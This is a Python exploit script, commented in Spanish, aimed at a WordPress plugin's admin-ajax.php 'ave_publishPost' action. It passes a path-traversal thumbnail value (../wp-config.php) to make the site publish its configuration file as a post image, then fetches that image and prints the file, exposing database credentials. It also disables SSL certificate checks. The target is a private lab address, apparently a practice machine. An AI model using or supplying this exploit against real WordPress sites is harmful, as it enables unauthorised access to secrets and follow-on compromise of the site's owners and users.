import random
import urllib.request
import re
import ssl

# Deshabilita la verificación del certificado SSL
ssl._create_default_https_context = ssl._create_unverified_context

# URL del sitio WordPress
url = "https://192.168.1.203:12380/blogblog/"

# Genera un ID aleatorio
randomID = int(random.random() * 100000000000000000)

# Hace una solicitud al punto final admin-ajax.php con los parámetros apropiados
req = urllib.request.Request(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
with urllib.request.urlopen(req) as objHtml:
    content = objHtml.readlines()

# Busca dígitos en el contenido para identificar el ID de la publicación
for line in content:
    numbers = re.findall(r'\d+', line.decode('utf-8'))
    id = numbers[-1]
    id = int(id) // 10  # Cambia la división a entera

# Hace una solicitud a la URL del post basada en el ID encontrado
req = urllib.request.Request(url + '/?p=' + str(id))
with urllib.request.urlopen(req) as objHtml:
    content = objHtml.readlines()

# Busca la URL de la imagen en el contenido y luego imprime el contenido del archivo wp-config.php
for line in content:
    if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line.decode('utf-8'):
        urls = re.findall('"(https?://.*?)"', line.decode('utf-8'))
        with urllib.request.urlopen(urls[0]) as response:
            print(response.read().decode('utf-8'))
